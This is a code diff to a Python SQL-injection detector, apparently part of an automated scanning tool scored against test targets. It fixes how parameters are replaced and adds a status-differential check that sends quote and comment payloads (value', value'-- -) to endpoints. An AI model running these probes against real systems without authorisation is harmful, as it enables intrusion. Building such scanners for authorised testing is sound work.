@@ -48,6 +48,23 @@ _SQL_ERROR_MARKERS = (
 )
 
 
+def _with_param(url: str, param: str, value: str) -> str:
+    """Return ``url`` with ``param`` REPLACED (not appended) by ``value``.
+
+    The prior oracle passed httpx ``params={param: value}`` which appends a
+    second copy when the URL already carries that key (``?category=Gifts`` +
+    ``category=payload`` => ``?category=Gifts&category=payload``). Most backends
+    read the FIRST occurrence — the valid one — so the payload never reached the
+    query and injection was missed on any endpoint discovered WITH its value.
+    """
+    from urllib.parse import urlencode, urlsplit, urlunsplit
+
+    parts = urlsplit(url)
+    q = dict(parse_qsl(parts.query, keep_blank_values=True))
+    q[param] = value
+    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))
+
+
 # Time-blind payloads keyed by DBMS. Each payload injects a DB-native sleep of
 # SLEEP_SECONDS so a measurable delay is unambiguous: a healthy endpoint returns
 # in well under one second; a vulnerable one waits the full sleep. Each payload
@@ -142,9 +159,15 @@ async def detect_error_based(
     if param is None:
         q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
         param = (list(q)[-1] if q else "q")
+
+    # Baseline value for this param (so payloads modify the REAL value in place,
+    # e.g. "Gifts" -> "Gifts'"). Falls back to a benign token when absent.
+    q0 = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
+    base_val = q0.get(param) or "1"
+
     for payload in _ERROR_PAYLOADS:
         try:
-            r = await client.get(url, params={param: payload})
+            r = await client.get(_with_param(url, param, payload))
         except Exception:
             continue
         body = (r.text or "")[:1200]
@@ -165,9 +188,45 @@ async def detect_error_based(
                 # under the 'response' key so the scorer registers a real
                 # response artifact and the finding is evidence-complete.
                 "response": body,
-                "request": f"GET {url}?{param}={payload}",
+                "request": f"GET {_with_param(url, param, payload)}",
                 "confidence": 1.0,
             }
+
+    # Status-differential fallback. A realistic app (e.g. PortSwigger's demo)
+    # returns a GENERIC 500 with no raw DB string, so the marker check above
+    # can't fire. But injection still shows an objective, three-point signature:
+    #   baseline value           -> normal status (e.g. 200)
+    #   value + "'"              -> broken SQL      (differs; typically 5xx)
+    #   value + "'-- -"          -> comment repairs -> back to baseline status
+    # The repair step is what separates SQLi from a param that merely rejects odd
+    # input: a generic validation error would reject BOTH the quote and the
+    # commented quote. Requiring break!=baseline AND repair==baseline keeps this
+    # false-positive-safe.
+    try:
+        rb = await client.get(_with_param(url, param, base_val))
+        r_break = await client.get(_with_param(url, param, base_val + "'"))
+        r_fix = await client.get(_with_param(url, param, base_val + "'-- -"))
+    except Exception:
+        return None
+
+    baseline_sc, break_sc, fix_sc = rb.status_code, r_break.status_code, r_fix.status_code
+    broke = break_sc != baseline_sc and break_sc >= 500
+    repaired = fix_sc == baseline_sc
+    if broke and repaired:
+        return {
+            "technique": "error_based",
+            "endpoint": url,
+            "parameter": param,
+            "payload": base_val + "'",
+            "http_status": break_sc,
+            "db_error_excerpt": (
+                f"status-differential: baseline({base_val})={baseline_sc}, "
+                f"break({base_val}')={break_sc}, repair({base_val}'-- -)={fix_sc}"
+            ),
+            "response": (r_break.text or "")[:1200],
+            "request": f"GET {_with_param(url, param, base_val + chr(39))}",
+            "confidence": 1.0,
+        }
     return None
 
 
